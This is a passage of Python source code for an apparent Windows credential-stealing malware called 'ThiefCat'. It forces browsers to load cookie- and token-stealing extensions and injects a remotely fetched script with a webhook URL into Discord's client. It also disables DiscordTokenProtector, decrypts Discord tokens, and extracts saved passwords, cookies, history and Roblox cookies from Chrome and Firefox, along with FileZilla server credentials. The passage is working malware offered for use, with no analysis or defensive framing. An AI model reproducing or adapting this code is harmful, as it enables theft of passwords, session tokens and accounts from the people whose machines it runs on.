                                    (shortcut_name == 'SRWare Iron' and self.iron) or \
                                    (shortcut_name == 'Opera Neon' and self.operaneon) or \
                                    (shortcut_name == 'Comodo Dragon' and self.dragon) or \
                                    (shortcut_name == 'Torch Browser' and self.torch) or \
                                    (shortcut_name == 'Slimjet' and self.slimjet) or \
                                    (shortcut_name == 'Kiwi Browser' and self.kiwi):
                                shortcut_dir = os.path.dirname(shortcut_path)
                                if os.path.exists(shortcut_dir):
                                    powershell_command = (
                                    f'$WshShell = New-Object -comObject WScript.Shell; '
                                    f'$Shortcut = $WshShell.CreateShortcut(""{shortcut_path}""); '
                                    f'$Shortcut.Arguments = ""--load-extension={extensions_path}/{extension_name}/extension-cookies,{extensions_path}/{extension_name}/extension-tokens""; '
                                    f'$Shortcut.Save()'
                                    )
                                    try:
                                        Popen([""powershell"", ""-Command"", powershell_command], creationflags=CREATE_NEW_CONSOLE)
                                        time.sleep(2)
                                    except Exception as e:
                                        time.sleep(2)
                                        pass
                except Exception as e:
                    pass

                try:
                    for shortcut_name in ['Google Chrome', 'Opera', 'Opera GX', 'Opera Neon', 'Comodo Dragon', 'Slimjet', 'Torch Browser', 'Brave', 'Vivaldi', 'Microsoft Edge', 'Yandex Browser', 'SRWare Iron', 'Kiwi Browser']:
                        shortcut_path = self.path_shortcutnav_programdata.get(shortcut_name)
                        if shortcut_path:
                            if (shortcut_name == 'Google Chrome' and self.chrome) or \
                                    (shortcut_name == 'Opera' and self.opera) or \
                                    (shortcut_name == 'Opera GX' and self.operagx) or \
                                    (shortcut_name == 'Brave' and self.brave) or \
                                    (shortcut_name == 'Vivaldi' and self.vivaldi) or \
                                    (shortcut_name == 'Microsoft Edge' and self.edge) or \
                                    (shortcut_name == 'Yandex Browser' and self.yandex) or \
                                    (shortcut_name == 'SRWare Iron' and self.iron) or \
                                    (shortcut_name == 'Opera Neon' and self.operaneon) or \
                                    (shortcut_name == 'Comodo Dragon' and self.dragon) or \
                                    (shortcut_name == 'Torch Browser' and self.torch) or \
                                    (shortcut_name == 'Slimjet' and self.slimjet) or \
                                    (shortcut_name == 'Kiwi Browser' and self.kiwi):
                                shortcut_dir = os.path.dirname(shortcut_path)
                                if os.path.exists(shortcut_dir):
                                    powershell_command = (
                                    f'$WshShell = New-Object -comObject WScript.Shell; '
                                    f'$Shortcut = $WshShell.CreateShortcut(""{shortcut_path}""); '
                                    f'$Shortcut.Arguments = ""--load-extension={extensions_path}/{extension_name}/extension-cookies,{extensions_path}/{extension_name}/extension-tokens""; '
                                    f'$Shortcut.Save()'
                                    )
                                    try:
                                        Popen([""powershell"", ""-Command"", powershell_command], creationflags=CREATE_NEW_CONSOLE)
                                        time.sleep(2)
                                    except Exception as e:
                                        time.sleep(2)
                                        pass
                except Exception as e:
                    pass

                try:
                    for shortcut_name in ['Google Chrome', 'Opera', 'Opera GX', 'Opera Neon', 'Comodo Dragon', 'Slimjet', 'Torch Browser', 'Brave', 'Vivaldi', 'Microsoft Edge', 'Yandex Browser', 'SRWare Iron', 'Kiwi Browser']:
                        shortcut_path = self.path_shortcutnav_additionnal.get(shortcut_name)
                        if shortcut_path:
                            if (shortcut_name == 'Google Chrome' and self.chrome) or \
                                    (shortcut_name == 'Opera' and self.opera) or \
                                    (shortcut_name == 'Opera GX' and self.operagx) or \
                                    (shortcut_name == 'Brave' and self.brave) or \
                                    (shortcut_name == 'Vivaldi' and self.vivaldi) or \
                                    (shortcut_name == 'Microsoft Edge' and self.edge) or \
                                    (shortcut_name == 'Yandex Browser' and self.yandex) or \
                                    (shortcut_name == 'SRWare Iron' and self.iron) or \
                                    (shortcut_name == 'Opera Neon' and self.operaneon) or \
                                    (shortcut_name == 'Comodo Dragon' and self.dragon) or \
                                    (shortcut_name == 'Torch Browser' and self.torch) or \
                                    (shortcut_name == 'Slimjet' and self.slimjet) or \
                                    (shortcut_name == 'Kiwi Browser' and self.kiwi):
                                shortcut_dir = os.path.dirname(shortcut_path)
                                if os.path.exists(shortcut_dir):
                                    powershell_command = (
                                    f'$WshShell = New-Object -comObject WScript.Shell; '
                                    f'$Shortcut = $WshShell.CreateShortcut(""{shortcut_path}""); '
                                    f'$Shortcut.Arguments = ""--load-extension={extensions_path}/{extension_name}/extension-cookies,{extensions_path}/{extension_name}/extension-tokens""; '
                                    f'$Shortcut.Save()'
                                    )
                                    try:
                                        Popen([""powershell"", ""-Command"", powershell_command], creationflags=CREATE_NEW_CONSOLE)
                                        time.sleep(2)
                                    except Exception as e:
                                        time.sleep(2)
                                        pass
                except Exception as e:
                    pass
        except Exception as e:
            pass

    def injection_discord(self):
        if self.find_in_config(""AEZRETRYY5"") != ""yes"":
            return
        try:
            discord_paths = [
                os.path.join(self.appdata, p)
                for p in os.listdir(self.appdata)
                if ""discord"" in p.lower()
            ]
            for discord_path in discord_paths:
                app_paths = [
                    os.path.join(discord_path, p)
                    for p in os.listdir(discord_path)
                    if re.match(r""app-(\d*\.\d*)*"", p)
                ]
                for app_path in app_paths:
                    modules_path = os.path.join(app_path, ""modules"")
                    if not os.path.exists(modules_path):
                        continue
                    inj_paths = [
                        os.path.join(modules_path, p)
                        for p in os.listdir(modules_path)
                        if re.match(fr""{coresecretname}-\d+"", p)
                    ]
                    for inj_path in inj_paths:
                        for root, dirs, files in os.walk(inj_path):
                            if ""index.js"" in files:
                                idx_path = os.path.join(root, ""index.js"")
                        if self.localstartup not in argv[0]:
                            try:
                                for inj_path in inj_paths:
                                    for root, dirs, files in os.walk(inj_path):
                                        if ""index.js"" in files:
                                            os.makedirs(os.path.join(root, ""ThiefCat""), exist_ok=True)
                            except PermissionError:
                                pass
                        if self.webapi_find in self.thishawk_webh:
                            core_asar = self.find_in_config(""url_hawkinject"")
                            try:
                                f = httpx.get(core_asar, verify=False).text
                                if self.apilink != ""%\u200BAPI_LINK%"" and self.apilink != """" and self.apilink != "" "":
                                    f = f.replace(""%API_URL%"", self.apilink)
                                    f = f.replace(""%NAME_CREATOR%"", self.str_creator_)
                                    f = f.replace(""%TRANSFER_URL%"", self.thezip_url.replace(""\n"", """"))
                                    f = f.replace(""\n\n"", ""\n"")
                                else:
                                    f = f.replace(""%WEBHOOK%"", self.thishawk_webh)
                                    f = f.replace(""%NAME_CREATOR%"", self.str_creator_)
                                    f = f.replace(""%TRANSFER_URL%"", self.thezip_url.replace(""\n"", """"))
                                    f = f.replace(""\n\n"", ""\n"")
                            except AttributeError:
                                pass
                        try:
                            with open(idx_path, ""w"", errors=""ignore"", newline="""") as indexdiscfile:
                                indexdiscfile.write(f.rstrip('\r\n'))
                        except PermissionError:
                            pass
                    
                        if self.find_in_config(""killdiscord_config""):
                            file_name = os.path.splitext(os.path.basename(discord_path))[0]
                            app_exe = os.path.join(app_path, file_name + "".exe"")
                            if not os.path.isabs(app_exe):
                                raise ValueError(f""Invalid path: {app_exe}"")
                            cmd = [app_exe]
                            try:
                                subprocess.run(cmd, check=True)
                            except subprocess.CalledProcessError:
                                pass
                            except FileNotFoundError:
                                pass
                            except Exception:               
                                pass
        except:
            pass
                

    def soundlilvoice(self):
        if self.soundedornot != 'yes':
            return
        try:
            ...
            """"""response = requests.get('https://anonfiles.com/ca048cx0z3/hawkish_mp3')
            if response.status_code == 200:
                with open(self.roaming, ""thiefced"", ""sound.mp3"", 'wb') as file:
                    file.write(response.content)
                command = f'powershell -WindowStyle Hidden -c ""Start-Process \'{os.path.join(self.roaming, ""thiefced"", ""sound.mp3"")}\'""'
                subprocess.run(command, shell=True)
                time.sleep(0.5)
                hide = win32gui.GetForegroundWindow()
                win32gui.ShowWindow(hide, win32con.SW_HIDE)
            else:
                pass""""""
        except:
            pass

    async def thiefcat_BypassTokenProtector(self):
        try:
            tp = os.path.join(self.roaming, ""DiscordTokenProtector"")
            config = os.path.join(tp, ""config.json"")
            if not os.path.exists(tp) or not os.path.isdir(tp) or not os.path.isfile(config):
                return
            for i in [""DiscordTokenProtector.exe"", ""ProtectionPayload.dll"", ""secure.dat""]:
                try:
                    os.remove(os.path.join(tp, i))
                except FileNotFoundError:
                    pass
            with open(config, ""r"", errors=""ignore"") as f:
                try:
                    item = json.load(f)
                except json.decoder.JSONDecodeError:
                    return
            item[f""{NotKSCH58}_is_here""] = f""https://github.com/freeman649""
            item[""auto_start""] = False
            item[""auto_start_discord""] = False
            item[""integrity""] = False
            item[""integrity_allowbetterdiscord""] = False
            item[""integrity_checkexecutable""] = False
            item[""integrity_checkhash""] = False
            item[""integrity_checkmodule""] = False
            item[""integrity_checkscripts""] = False
            item[""integrity_checkresource""] = False
            item[""integrity_redownloadhashes""] = False
            item[""iterations_iv""] = 364
            item[""iterations_key""] = 457
            item[""version""] = 69420
            with open(config, ""w"") as f:
                json.dump(item, f, indent=2, sort_keys=True)
                f.write(f""\n\n//{NotKSCH58}_is_here | https://github.com/freeman649"")
        except:
            pass

    async def kill_process_id(self):
        try:
            bllist = self.find_in_config(""blacklistedprog"")
            for i in [
                    ""discord"",
                    ""discordtokenprotector"",
                    ""discordcanary"",
                    ""discorddevelopment"",
                    ""discordptb"",
                ]:
                bllist.append(i)
            for proc in psutil.process_iter():
                if any(procstr in proc.name().lower() for procstr in bllist):
                    try:
                        proc.kill()
                    except (psutil.NoSuchProcess, psutil.AccessDenied):
                        pass
            for proc in psutil.process_iter():
                if any(procstr in proc.name().lower() for procstr in bllist):
                    try:
                        proc.kill()
                    except (psutil.NoSuchProcess, psutil.AccessDenied):
                        pass
        except:
            pass

                
    async def thiefcat_BypassBetterDsc(self):
        try:
            bd = self.roaming + ""\\BetterDiscord\\data\\betterdiscord.asar""
            if os.path.exists(bd):
                x = self.webapi_find
                with open(bd, ""r"", encoding=""cp437"", errors=""ignore"") as f:
                    txt = f.read()
                    content = txt.replace(x, f""{NotKSCH58}_goat"")
                with open(bd, ""w"", newline="""", encoding=""cp437"", errors=""ignore"") as f:
                    f.write(content)
        except:
            pass

    def decrypt_value(self, buff, master_key):
        try:
            iv = buff[3:15]
            payload = buff[15:]
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            decrypted_pass = cipher.decrypt(payload)
            decrypted_pass = decrypted_pass[:-16].decode()
            return decrypted_pass
        except Exception:
            return ""Cannot decrypt password""

    def thiefcat_GetToken(self):
        paths_to_check = {
            'Discord': self.roaming + '\\discord\\Local Storage\\leveldb\\',
            'Discord Canary': self.roaming + '\\discordcanary\\Local Storage\\leveldb\\',
            'Lightcord': self.roaming + '\\Lightcord\\Local Storage\\leveldb\\',
            'Discord PTB': self.roaming + '\\discordptb\\Local Storage\\leveldb\\',
            'Opera': self.roaming + '\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\',
            'Opera GX': self.roaming + '\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\',
            'Amigo': self.appdata + '\\Amigo\\User Data\\Local Storage\\leveldb\\',
            'Torch': self.appdata + '\\Torch\\User Data\\Local Storage\\leveldb\\',
            'Kometa': self.appdata + '\\Kometa\\User Data\\Local Storage\\leveldb\\',
            'Orbitum': self.appdata + '\\Orbitum\\User Data\\Local Storage\\leveldb\\',
            'CentBrowser': self.appdata + '\\CentBrowser\\User Data\\Local Storage\\leveldb\\',
            '7Star': self.appdata + '\\7Star\\7Star\\User Data\\Local Storage\\leveldb\\',
            'Sputnik': self.appdata + '\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb\\',
            'Vivaldi': self.appdata + '\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\',
            'Chrome SxS': self.appdata + '\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\',
            'Chrome': self.appdata + '\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\',
            'Chrome1': self.appdata + '\\Google\\Chrome\\User Data\\Profile 1\\Local Storage\\leveldb\\',
            'Chrome2': self.appdata + '\\Google\\Chrome\\User Data\\Profile 2\\Local Storage\\leveldb\\',
            'Chrome3': self.appdata + '\\Google\\Chrome\\User Data\\Profile 3\\Local Storage\\leveldb\\',
            'Chrome4': self.appdata + '\\Google\\Chrome\\User Data\\Profile 4\\Local Storage\\leveldb\\',
            'Chrome5': self.appdata + '\\Google\\Chrome\\User Data\\Profile 5\\Local Storage\\leveldb\\',
            'Epic Privacy Browser': self.appdata + '\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\',
            'Microsoft Edge': self.appdata + '\\Microsoft\\Edge\\User Data\\Defaul\\Local Storage\\leveldb\\',
            'Uran': self.appdata + '\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb\\',
            'Yandex': self.appdata + '\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\',
            'Brave': self.appdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\',
            'Iridium': self.appdata + '\\Iridium\\User Data\\Default\\Local Storage\\leveldb\\'
        }

        for name, gang in paths_to_check.items():
            if not os.path.exists(gang):
                continue
            disc = name.replace("" "", """").lower()
            if ""cord"" in gang:
                if os.path.exists(self.roaming + f'\\{disc}\\Local State'):
                    for filename in os.listdir(gang):
                        if filename[-3:] not in [""log"", ""ldb""]:
                            continue
                        for find in [x.strip() for x in open(f'{gang}\\{filename}', errors='ignore').readlines() if x.strip()]:
                            for y in re.findall(self.rgx_thiefcat, find):
                                token = self.decrypt_value(base64.b64decode(y.split('dQw4w9WgXcQ:')[1]), self.get_master_key(self.roaming + f'\\{disc}\\Local State'))
                                r = requests.get(self.disc_url_api, headers={
                                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',
                                    'Content-Type': 'application/json',
                                    'Authorization': token})
                                if r.status_code == 200:
                                    uid = r.json()['id']
                                    if uid not in self.NotKSCH58id:
                                        self.hawked.append(token)
                                        self.NotKSCH58id.append(uid)

    def dir_random_create(self, _dir: str or os.PathLike = gettempdir()):
        filname = """".join(random.SystemRandom().choice(""abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"")for _ in range(random.randint(10, 20)))
        path = os.path.join(_dir, filname)
        open(path, ""x"")
        return path
    
    def test_firefox_psw(self, export):
        if not export:
            return
        try:
            p = Popen([""pass""], stdout=PIPE, stderr=PIPE)
        except OSError as e:
            if e.errno == 2:
                pass
            else:
                pass
        out, err = p.communicate()
        if p.returncode != 0:
            if 'Try ""pass init""' in err:
                pass
            else:
                pass

    def export_pass(self, to_export, prefix):
        for address in to_export:
            for user, passw in to_export[address].items():
                if len(to_export[address]) > 1:
                    passname = u""{0}/{1}/{2}"".format(prefix, address, user)
                else:
                    passname = u""{0}/{1}"".format(prefix, address)
                data = u""{0}\n{1}\n"".format(passw, user)
                cmd = [""pass"", ""insert"", ""--force"", ""--multiline"", passname]
                p = Popen(cmd, stdout=PIPE, stderr=PIPE, stdin=PIPE)
                out, err = p.communicate(data.encode(""utf8""))
                if p.returncode != 0:
                    pass


    def get_sections(self, profiles):
        sections = {}
        i = 1
        for section in profiles.sections():
            if section.startswith(""Profile""):
                sections[str(i)] = profiles.get(section, ""Path"")
                i += 1
            else:
                continue
        return sections


    def read_profiles(self, basepath, list_profiles):
        profileini = os.path.join(basepath, ""profiles.ini"")
        if not os.path.isfile(profileini):
            pass
        profiles = ConfigParser()
        profiles.read(profileini)
        return profiles

    def get_profile(self, basepath, interactive=False, choice=None, list_profiles=False):
        try:
            profiles = self.read_profiles(basepath, list_profiles)
        except Exception as e:
            pass
        else:
            sections = self.get_sections(profiles)
            if not interactive and choice:
                selected_sections = [sections[c] for c in choice if c in sections]
            else:
                selected_sections = list(sections.values())
            profiles = [os.path.join(basepath, section) for section in selected_sections]
            for profile in profiles:
                if not os.path.isdir(profile):
                    pass
        return profiles
    
    def get_master_key(self, path):
        with open(path, ""r"", encoding=""utf-8"") as f:
            c = f.read()
        local_state = json.loads(c)
        master_key = base64.b64decode(local_state[""os_crypt""][""encrypted_key""])
        master_key = master_key[5:]
        master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
        return master_key


    def parse_sys_args(self):
        if os.name == ""nt"":
            profile_path = os.path.join(os.environ['APPDATA'], ""Mozilla"", ""Firefox"")
        elif os.uname()[0] == ""Darwin"":
            profile_path = ""~/Library/Application Support/Firefox""
        else:
            profile_path = ""~/.mozilla/firefox""
        args = {
            'profile': profile_path,
            'export_pass': False,
            'pass_prefix': u""web"",
            'format': ""human"",
            'delimiter': "";"",
            'quotechar': '""',
            'interactive': True,
            'choice': None,
            'list': False,
            'verbose': 0
        }
        args['delimiter'] = "";"" if args['delimiter'] != ""\\t"" else ""\t""
        return args
    
    def load_profile(self, profile):
        try:
            self.profile = profile
            e = self.NSS._NSS_Init(b""sql:"" + self.profile.encode(""utf8""))
            if e != 0:
                pass
        except:
            pass

    def authenticate(self, interactive):
        keyslot = self.NSS._PK11_GetInternalKeySlot()
        if not keyslot:
            self.NSS.handle_error()
            pass
        self.NSS._PK11_FreeSlot(keyslot)

    def unload_profile(self):
        e = self.NSS._NSS_Shutdown()
        if e != 0:
            pass

    def decode_entry(self, user64, passw64):
        user = self.NSS.decode(user64)
        passw = self.NSS.decode(passw64)
        return user, passw
    
    def obtain_credentials(self, profile):
        try:
            credentials = JsonCredentials(profile)
        except NotFoundError:
            try:
                credentials = SqliteCredentials(profile)
            except NotFoundError:
                pass
        return credentials

    def fetch_firefox_bookmarks(self, profile_path):
        directory = os.path.join(self.dir, ""Mozilla"")
        bookmarks_db_path = os.path.join(profile_path, ""places.sqlite"")
        try:
            conn = sqlite3.connect(bookmarks_db_path)
            cursor = conn.cursor()
            cursor.execute(""SELECT moz_bookmarks.title, moz_places.url FROM moz_bookmarks INNER JOIN moz_places ON moz_bookmarks.fk = moz_places.id WHERE moz_bookmarks.type = 1"")
            bookmarks_data = cursor.fetchall()
            conn.close()
        except sqlite3.Error as e:
            return """"
        
        try:
            bookmarks_str = """"
            for bookmark in bookmarks_data:
                title = bookmark[0]
                url = bookmark[1]
                entry_str = ""Title: {:<40} URL: {}\n"".format(title, url)
                bookmarks_str += entry_str
                
            os.makedirs(directory, exist_ok=True)
            with open(os.path.join(self.dir, ""Firefox"", f""Bookmarks.txt""), ""w"", encoding=""utf-8"") as output_file:
                output_file.write(bookmarks_str)
            
            self.thingstocount[f'bookmarksbaby'] += len(title)
        except:
            pass


    def fetch_firefox_credit_cards(self, profile_path):
        directory = os.path.join(self.dir, ""Mozilla"")
        signons_db_path = os.path.join(profile_path, ""signons.sqlite"")
        try:
            conn = sqlite3.connect(signons_db_path)
            cursor = conn.cursor()
            cursor.execute(""SELECT hostname, username, password FROM moz_logins WHERE (password_type = 1 OR password_type = 2) AND times_used > 0"")
            credit_cards_data = cursor.fetchall()
            conn.close()
        except sqlite3.Error as e:
            return """"
        try:
            if len(credit_cards_data) > 0:
                credit_cards_str = """"
                for card in credit_cards_data:
                    hostname = card[0]
                    username = card[1]
                    password = card[2]
                    entry_str = ""Hostname: {:<40} Username: {:<20} Password: {}\n"".format(hostname, username, password)
                    credit_cards_str += entry_str
                os.makedirs(directory, exist_ok=True)
                with open(os.path.join(self.dir, ""Firefox"", f""Credits Cards.txt""), ""w"", encoding=""utf-8"") as output_file:
                    output_file.write(credit_cards_str)
                self.thingstocount[f'creditcard'] += len(username)
        except:
            pass


    def fetch_firefox_data(self, profile_path):
        
        directory = os.path.join(self.dir, ""Mozilla"")
        data_db_path = os.path.join(profile_path, ""cookies.sqlite"")
        try:
            conn = sqlite3.connect(data_db_path)
            cursor = conn.cursor()
            cursor.execute(""SELECT host, isSecure, path, isHttpOnly, expiry, name, value FROM moz_cookies"")
            data = cursor.fetchall()
            conn.close()
        except sqlite3.Error as e:
            return """"

        data_str = """"
        for item in data:
            host = item[0]
            is_secure = ""TRUE"" if item[1] else ""FALSE""
            path = item[2]
            is_http_only = ""TRUE"" if item[3] else ""FALSE""
            expiration = str(item[4])
            name = item[5]
            value = item[6]
            item_str = f""{host}\t{is_secure}\t{path}\t{is_http_only}\t{expiration}\t{name}\t{value}""
            data_str += item_str + ""\n""
        
        try:
            os.makedirs(directory, exist_ok=True)
            with open(os.path.join(self.dir, ""Firefox"", f""{justaterm}.txt""), ""w"", encoding=""utf-8"") as output_file:
                output_file.write(data_str)
            
            self.thingstocount[f'{justatermlil}'] += len(host)
        except Exception as e:
            pass

    def decrypt_passwords(self, export):
        directory = os.path.join(self.dir, ""Mozilla"")
        def output_line(line, file):
            file.write(line)

        got_password = False
        credentials = self.obtain_credentials(self.profile)
        to_export = {}
        os.makedirs(directory, exist_ok=True)
        with open(os.path.join(self.dir, ""Firefox"", f""Passwords.txt""), ""w"", encoding=""utf-8"") as output_file:
            for url, user, passw, enctype in credentials:
                got_password = True
                if enctype:
                    user, passw = self.decode_entry(user, passw)
                if export:
                    address = urlparse(url)
                    if address.netloc not in to_export:
                        to_export[address.netloc] = {user: passw}
                    else:
                        to_export[address.netloc][user] = passw
                else:
                    output = (
                        u""\nWebsite: {0}\n"".format(url),
                        u""ID: {0}\n"".format(user),
                        u""Password: {0}\n"".format(passw),
                    )
                    for line in output:
                        output_line(line, output_file)
        credentials.done()
        if not got_password:
            pass
        if export:
            return to_export
        
    def fetch_firefox_history(self, profile_path):
        directory = os.path.join(self.dir, ""Mozilla"")
        history_db_path = os.path.join(profile_path, ""places.sqlite"")
        try:
            conn = sqlite3.connect(history_db_path)
            cursor = conn.cursor()
            cursor.execute(""SELECT url, title, visit_count FROM moz_places"")
            history_data = cursor.fetchall()
            conn.close()
        except sqlite3.Error as e:
            return """"

        history_str = """"
        for entry in history_data:
            url = entry[0]
            title = entry[1]
            visit_count = entry[2]
            entry_str = f""Visit Count: {visit_count} Title: {title} Link: {url}\n""
            history_str += entry_str
            
        os.makedirs(directory, exist_ok=True)
        with open(os.path.join(self.dir, ""Firefox"", ""History.txt""), ""w"", encoding=""utf-8"") as file:
            file.write(history_str)
        self.thingstocount['historybaby'] += len(url)
    
    def is_firefox_installed(self):
        program_files_path = os.environ.get(""PROGRAMFILES"")
        firefox_path = os.path.join(program_files_path, ""Mozilla Firefox"", ""firefox.exe"")
        return os.path.exists(firefox_path)


    def firefox(self):
        if self.Found_Browsers != ""yes"":
            return
        args = self.parse_sys_args()
        if not self.is_firefox_installed():
            return
        self.test_firefox_psw(args[""export_pass""])
        basepath = os.path.expanduser(args['profile'])
        profiles = self.get_profile(basepath, args['interactive'], args['choice'], args['list'])
        for profile in profiles:
            try:
                self.fetch_firefox_history(profile)
                self.fetch_firefox_data(profile)
                self.load_profile(profile)
                self.fetch_firefox_credit_cards(profile)
                self.fetch_firefox_bookmarks(profile)
                self.authenticate(args['interactive'])
                to_export = self.decrypt_passwords(
                    export=args['export_pass'],
                )
                if args['export_pass']:
                    self.export_pass(to_export, args['pass_prefix'])
                        
                self.unload_profile()
                self.firefox_installed = True
            except Exception as e:
                pass

    def thiefcat_GetFilezilla(self):
        if self.Found_FileZilla != ""yes"":
            return
        try:
            directory = os.path.join(self.dir, ""FileZilla"")
            if os.path.exists(self.recentservers_xml_path):
                recentservers_credentials = self.decode_filezilla_xml(self.recentservers_xml_path)
                if recentservers_credentials:
                    os.makedirs(directory, exist_ok=True)
                    with open(os.path.join(self.dir, ""FileZilla"", ""Servers.txt""), ""a"", encoding=""utf-8"") as f:
                        for credential in recentservers_credentials:
                            try:
                                host = credential.get(""Host"", """")
                                port = credential.get(""Port"", """")
                                protocol = credential.get(""Protocol"", """")
                                user = credential.get(""User"", """")
                                password = credential.get(""Pass"", """")
                                encoding = credential.get(""Encoding"", """")
                                
                                if host:
                                    f.write(f""Host: {host}\n"")
                                if port:
                                    f.write(f""Port: {port}\n"")
                                if protocol:
                                    f.write(f""Protocol: {protocol}\n"")
                                if user:
                                    f.write(f""User: {user}\n"")
                                if password:
                                    f.write(f""Password: {password}\n"")
                                if encoding:
                                    f.write(f""Encoding: {encoding}\n"")
                                
                                f.write(""\n"")
                                
                                self.thingstocount['passwrd'] += len(password)
                            except:
                                pass
        except:
            pass

    @extract_try
    def thiefcat_browsers4(self, name: str, path: str, profile: str):
        if self.Found_Browsers != ""yes"":
            return
        try:
            path = os.path.join(path, profile, ""Login Data"")
            if not os.path.isfile(path):
                return

            loginvault = self.dir_random_create()
            try:
                shutil.copy2(path, loginvault)
                conn = sqlite3.connect(loginvault)
                cursor = conn.cursor()
                with open(os.path.join(self.dir, ""Browsers"", ""Passwords.txt""), ""a"", encoding=""utf-8"") as f:
                    for url, username, password in cursor.execute(""SELECT origin_url, username_value, password_value FROM logins""):
                        if url:
                            password = self.value_decrypt(password, self.masterkey)
                            f.write(
                                f""Website: {url}\nID: {username}\nPassword: {password}\n\n"")
                            self.thingstocount['passwrd'] += len(password)
                cursor.close()
            finally:
                conn.close()
                os.remove(loginvault)
        except:
            pass


    @extract_try
    def thiefcat_browsers1(self, file_name: str, file_path: str, proc_file: str):
        if self.Found_Browsers != ""yes"":
            return
        try:
            cckcs = self.dir_random_create()
            shutil.copy2(os.path.join(file_path, proc_file, ntwrk, f""{justaterm}""), cckcs)
            with sqlite3.connect(cckcs) as conn:
                cursor = conn.cursor()
                query = ""SELECT {columns} FROM {table}"".format(columns=""host_key, name, path, encrypted_value, expires_utc"", table=f""{justatermlil}"")
                for res in cursor.execute(query).fetchall():
                    host_key, name, path, encrypted_value, expires_utc = res
                    value = self.value_decrypt(encrypted_value, self.masterkey)
                    if host_key and name and value:
                        with open(os.path.join(self.dir, ""Browsers"", f""{justaterm}.txt""), ""a"", encoding=""utf-8"") as f:
                            f.write(f""{host_key}\t{'FALSE' if expires_utc == 0 else 'TRUE'}\t{path}\t{'FALSE' if host_key.startswith('.') else 'TRUE'}\t{expires_utc}\t{name}\t{value}\n"")
            os.remove(cckcs)
            self.thingstocount[f'{justatermlil}'] += len(host_key)
        except:
            pass
    
    @extract_try
    def thiefcat_GetGoogle2(self):
        if self.Found_Browsers != ""yes"":
            return
        try:
            with open(os.path.join(self.dir, ""Google"", f""{justaterm}.txt""), ""w"", encoding=""cp437"", errors=""ignore"") as f:
                for prof in os.listdir(self.chrome_user_path):
                    if re.match(self.rgx_chrome, prof):
                        login_db = os.path.join(self.chrome_user_path, prof, ntwrk, f""{justatermlil}"")
                        login = self.files_creating()
                        shutil.copy2(login_db, login)
                        conn = sqlite3.connect(login)
                        cursor = conn.cursor()
                        cursor.execute(f""SELECT host_key, name, encrypted_value from {justatermlil}"")

                        for r in cursor.fetchall():
                            host, user, encrypted_value = r
                            dcryptedcks = self.value_decrypt(encrypted_value, self.chrome_key)
                            if host != """":
                                f.write(f""{host}\tTRUE\t\t/FALSE\t2597573456\t{user}\t{dcryptedcks}\n"")
                            if ""_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_"" in dcryptedcks:
                                self.rblxcckcs.append(dcryptedcks)
                            self.thingstocount[f'{justatermlil}'] += len(dcryptedcks)
                            self.thingstocount['roblox_friendly'] += len(self.rblxcckcs)
                        cursor.close()
                        conn.close()
                        os.remove(login)
                f.close()
        except:
            pass
    
    @extract_try
    def thiefcat_GetGoogle1(self):
        if self.Found_Browsers != ""yes"":
            return
        try:
            with open(os.path.join(self.dir, ""Google"", ""Passwords.txt""), ""w"", encoding=""cp437"", errors=""ignore"") as f:
                for prof in os.listdir(self.chrome_user_path):
                    if re.match(self.rgx_chrome, prof):
                        login_db = os.path.join(
                            self.chrome_user_path, prof, ""Login Data"")
                        login = self.files_creating()
                        shutil.copy2(login_db, login)

                        with sqlite3.connect(login) as conn:
                            cursor = conn.cursor()
                            cursor.execute(
                                ""SELECT origin_url, username_value, password_value FROM logins"")
                            for r in cursor.fetchall():
                                url, username, encrypted_password = r
                                decrypted_password = self.value_decrypt(
                                    encrypted_password, self.chrome_key)
                                if url:
                                    f.write(
                                        f""Website: {url}\nID: {username}\nPassword: {decrypted_password}\n\n"")
                                    self.thingstocount['passwrd'] += len(
                                        decrypted_password)
                        os.remove(login)
        except:
            pass
#Modified by xTyzenIV And le_chat_blanc999
    def thiefcat_browsers3(self, name: str, path: str, profile: str):
        if self.Found_Browsers != ""yes"":
            return
        try:
            path = os.path.join(path, profile, ""Bookmarks"")
            if not os.path.isfile(path):
                return
            with open(path, ""r"", encoding=""utf-8"") as f:
                bookmarks_data = json.load(f)
            bookmarks = []
            if ""roots"" in bookmarks_data:
                for folder_key, folder_data in bookmarks_data[""roots""].items():
                    if ""children"" in folder_data:
                        for bookmark in folder_data[""children""]:
                            if ""type"" in bookmark and bookmark[""type""] == ""url"" and ""url"" in bookmark and ""name"" in bookmark:
                                visit_count = 0
                                last_visit_time = 0
                                if ""visit_count"" in bookmark:
                                    visit_count = bookmark[""visit_count""]
                                if ""date_last_visited"" in bookmark:
                                    last_visit_time = bookmark[""date_last_visited""]
                                bookmarks.append((bookmark[""url""], bookmark[""name""], visit_count, last_visit_time))
                                
            bookmarks.sort(key=lambda x: x[3], reverse=True)
            self.thingstocount[""bookmarksbaby""] += len(bookmarks)
            with open(os.path.join(self.dir, ""Browsers"", ""Bookmarks.txt""), ""a"", encoding=""utf-8"") as f:
                for bookmark in bookmarks:
                    f.write(""Title: {:<6} URL: {:<40}\n"".format(bookmark[1], bookmark[0]))
        except:
            pass
        


    def thiefcat_browsers2(self, name: str, path: str, profile: str):
        if self.Found_Browsers != ""yes"":
            return
        try:
            path = os.path.join(path, profile, ""History"")
            if not os.path.isfile(path):
                return
            historyvault = self.dir_random_create()
            shutil.copy2(path, historyvault)
            conn = sqlite3.connect(historyvault)
            cursor = conn.cursor()
            with open(
                os.path.join(self.dir, ""Browsers"", ""History.txt""), ""a"", encoding=""utf-8"", ) as f:
                sites = []
